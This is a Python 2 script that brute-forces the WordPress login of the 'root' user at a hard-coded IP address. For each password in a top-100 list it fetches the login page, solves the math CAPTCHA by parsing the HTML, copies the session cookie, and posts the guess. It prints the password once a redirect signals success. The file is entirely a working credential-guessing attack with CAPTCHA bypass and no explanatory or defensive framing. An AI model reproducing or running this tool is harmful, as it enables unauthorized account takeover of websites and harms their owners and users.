#!/usr/bin/python

import requests
import re
from HTMLParser import HTMLParser
import json


with open("top100.txt","r") as pas:
	for p in pas:
		ope = []
		headerss={'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0'}
		r = requests.get("http://167.99.232.57/wordpress/wp-login.php",headerss)
		suma = r.content.split("\n")[37].replace("\t","").replace('<input type="text" size="2" length="2" id="mc-input" class="mc-input" name="mc-value" value="" aria-required="true"/>',"x").replace("</span>","").replace("<span>","")
		html=HTMLParser()
		un = html.unescape(suma)
		#print un
		tmp = re.match('((.*) \+ (.*) = (.*))',un)
		ope.append(str(tmp.group(2)))
		ope.append(str(tmp.group(3)))
		ope.append(str(tmp.group(4)))
		value=0
		if 'x' in ope[2]:
			value = int(ope[0])+int(ope[1])
		elif 'x' in ope[0]:
			value = int(ope[2])-int(ope[1])
		else:
			value = int(ope[2])-int(ope[0])
		#print 'x=%d' % value
		cook_ie = filter(lambda x : 'mc_session' in x ,r.headers['Set-Cookie'].split(","))
		for i in range(len(cook_ie)):
			cook_ie[i]=cook_ie[i].split(";")[0]
		cookie= ";".join(cook_ie)

		payload = 'log=root&pwd='+p.replace("\n","")+'&mc-value='+str(value)+'&wp-submit=Log+In&redirect_to=http%3A%2F%2F167.99.232.57%2Fwordpress%2Fwp-admin%2F&testcookie=1'
		payload2={}
		payload2['log']="root"
		payload2['pwd']=p.replace("\n","")
		payload2['mc-value']=str(value)
		payload2['wp-submit']="Log+In"
		payload2['redirect_to']="http%3A%2F%2F167.99.232.57%2Fwordpress%2Fwp-admin%2F"
		payload2['testcookie']="1"
		
		url='http://167.99.232.57/wordpress/wp-login.php'
		header= {'Host': '167.99.232.57','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Language': 'en-US,en;q=0.5','Accept-Encoding': 'gzip, deflate','Referer': 'http://167.99.232.57/wordpress/wp-login.php','Content-Type': 'application/x-www-form-urlencoded','Content-Length': '%s'%str(len(payload)),'DNT': '1','Connection': 'close','Cookie': 'wordpress_test_cookie=WP+Cookie+check; %s'%cookie,'Upgrade-Insecure-Requests': '1'}
		r2=requests.post(url, headers=header, data=payload2)
		#print r2.content
		#print "\n"
		if r2.status_code > 300:
			print "Credenciales encontradas:"
			print "usuario: root"
			print "contrasena: %s" % payload2['pwd']
			break
